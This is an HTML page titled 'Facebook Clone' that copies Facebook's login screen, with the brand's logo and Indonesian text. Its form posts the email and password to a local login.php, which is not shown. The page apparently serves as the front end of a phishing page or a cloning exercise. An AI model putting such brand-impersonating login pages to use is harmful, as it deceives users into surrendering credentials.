<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Clone</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .wrapper {
            display: flex;
            width: 80%;
            justify-content: space-between;
            align-items: center;
        }
        .left-content {
            max-width: 600px;
        }
        .logo {
            font-size: 60px;
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .subtitle {
            font-size: 24px;
            color: #333;
            margin-bottom: 40px;
            text-align: left;
        }
        .login-box {
            background: #fff;
            padding: 30px;
            width: 400px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }
        .login-box button {
            width: 100%;
            background: #1877f2;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 18px;
            cursor: pointer;
        }
        .login-box a {
            display: block;
            margin-top: 12px;
            color: #1877f2;
            text-decoration: none;
            font-size: 16px;
        }
        .login-box a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="left-content">
            <div class="logo">facebook</div>
            <div class="subtitle">Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.</div>
        </div>
        <div class="login-box">
            <form action="login.php" method="POST">
                <input type="text" name="email" placeholder="Email atau nomor telepon" required>
                <input type="password" name="password" placeholder="Kata sandi" required>
                <button type="submit">Masuk</button>
                <a href="#">Lupa kata sandi?</a>
            </form>
        </div>
    </div>
</body>
</html>
